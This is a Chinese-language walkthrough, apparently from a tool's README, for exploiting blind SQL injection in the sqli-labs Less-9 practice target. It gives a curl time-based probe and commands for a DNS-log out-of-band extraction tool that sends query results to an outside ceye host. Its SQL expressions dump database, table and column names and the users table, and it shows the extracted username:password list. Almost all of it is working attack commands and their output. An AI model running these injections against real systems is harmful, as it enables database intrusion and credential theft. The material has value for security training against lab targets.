# 例子：sqli-labs Less-9（MySQL / Windows）

Less-9 页面永远无回显，闭合符号单引号。以下把 `TARGET` 换成靶机地址。

## 0. 确认注入

```bash
curl -o /dev/null -s -w "%{time_total}\n" "http://TARGET/Less-9/?id=1'%20and%20sleep(2)--+"
# 约 2 秒 → 时间盲注可用
```

## 1. 体检

```bash
python3 dnslogsqlinj3.py --provider ceye --token TOKEN --ident IDENT --check
# [+] 平台已收到记录 → 通道正常
```

## 2. 探路

```bash
python3 dnslogsqlinj3.py --provider ceye --token TOKEN --ident IDENT --dbms mysql \
  --url "http://TARGET/Less-9/?id=1'%PAYLOAD%--+-" \
  --expr "select 0x414243"
# [+] text: ABC
```

## 3. 脱库

```bash
--expr "select database()"
--expr "select group_concat(table_name) from information_schema.tables where table_schema=database()"
--expr "select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273"
--expr "select group_concat(username,0x3a,password) from users"
```

实测参考（188 字节的用户表，7 次请求、约 40 秒，瓶颈是每次 UNC 触发 SMB 要等超时）：

```
Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,
superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,
admin3:admin3,dhakkan:dumbo,admin4:admin4
```

## 4. 不通时

```bash
python3 dnslogsqlinj3.py ... -v          # 打印实际发出的 URL 和 SQL
python3 dnslogsqlinj3.py ... --encode strict   # 若目标 WAF 反而需要全量编码
python3 dnslogsqlinj3.py ... --technique time  # 放弃带外，退回 SLEEP
```
